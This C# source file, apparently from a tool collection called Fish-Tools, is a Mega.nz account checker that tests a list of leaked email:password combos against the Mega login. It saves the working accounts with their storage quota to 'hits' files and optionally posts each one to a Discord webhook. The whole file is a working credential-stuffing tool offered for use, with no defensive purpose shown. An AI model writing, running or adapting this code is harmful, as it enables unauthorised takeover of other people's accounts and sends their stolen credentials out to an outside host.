/*
------------------------------------------------------------
Made By notfishvr
github: https://github.com/official-notfishvr/Fish-Tools
------------------------------------------------------------
*/
using CG.Web.MegaApiClient;
using Fish_Tools.core.Utils;
using Newtonsoft.Json;
using System.Text;

namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
{
    internal class MegaAccountChecker
    {
        private static readonly string CombosFile = "Combos.txt";
        private static readonly string HitsFile = "Result/MegaHits [email pass].txt";
        private static readonly string HitsFile2 = "Result/MegaHits [email pass + Info].txt";
        private static bool UsingDiscord;
        private static string DiscordWebHook;
        private const int CooldownTime = 350; 

        public static void Main(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();

            File.WriteAllText(HitsFile, string.Empty);
            File.WriteAllText(HitsFile2, string.Empty);
            logger.Info($"Place your combo inside \"{CombosFile}\" in format EMAIL:PASSWORD and press enter.");
            Console.ReadKey();

            logger.Info($"If you want hits to be sent to your Discord, insert webhook and press enter. Otherwise, leave blank:");
            string discord = Console.ReadLine();
            UsingDiscord = !string.IsNullOrWhiteSpace(discord);
            DiscordWebHook = discord;

            TestCombos(logger).GetAwaiter().GetResult(); 
            Console.ReadLine();
        }
        private async static Task CheckLogin(string email, string password, Logger logger)
        {
            var client = new MegaApiClient();
            try
            {
                client.Login(email, password);

                if (client.IsLoggedIn)
                {
                    var accountInfo = client.GetAccountInformation();
                    string usedSpace = (accountInfo.UsedQuota / 1073741824L).ToString();
                    string totalSpace = (accountInfo.TotalQuota / 1073741824L).ToString();

                    string hitInfo2 = $"{email}:{password} | Used Space: {usedSpace}GB | Total Space: {totalSpace}GB";
                    string hitInfo = $"{email}:{password}";

                    if (UsingDiscord)
                    {
                        using (var httpClient = new HttpClient())
                        {
                            var payload = new
                            {
                                content = hitInfo2,
                                embeds = (object)null,
                                attachments = new object[] { }
                            };

                            var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
                            await httpClient.PostAsync(DiscordWebHook, content);
                        }
                    }
                    logger.Success($"[Good] {hitInfo}");
                    File.AppendAllText(HitsFile2, hitInfo2 + Environment.NewLine);
                    File.AppendAllText(HitsFile, hitInfo + Environment.NewLine);
                }
                else
                {
                    logger.Error($"[Bad] {email}");
                }

                int hitsCount = File.ReadLines(HitsFile).Count();
                Console.Title = $"Fish Tools | Hits: {hitsCount}";
            }
            catch (Exception ex)
            {
                logger.Error($"[Bad] {email} | Error: {ex.Message}");
            }
            finally
            {
                if (client.IsLoggedIn)
                {
                    client.Logout();
                }
            }
        }
        private static async Task TestCombos(Logger logger)
        {
            if (!File.Exists(CombosFile))
            {
                logger.Error($"No combos detected. Please upload them to \"{CombosFile}\".");
                File.Create(CombosFile).Close();
                return;
            }

            string[] combos = File.ReadAllLines(CombosFile);

            if (combos.Length == 0)
            {
                logger.Error("No combos detected. Please upload them to \"Combos.txt\".");
                return;
            }

            logger.Warn($"Loaded Combos: {combos.Length}");

            if (ConfirmContinue(logger))
            {
                foreach (var combo in combos)
                {
                    var split = combo.Split(':');
                    if (split.Length == 2)
                    {
                        await CheckLogin(split[0], split[1], logger);
                    }

                    await Task.Delay(CooldownTime);
                }
            }
        }
        private static bool ConfirmContinue(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();
            return true;
        }
    }
}
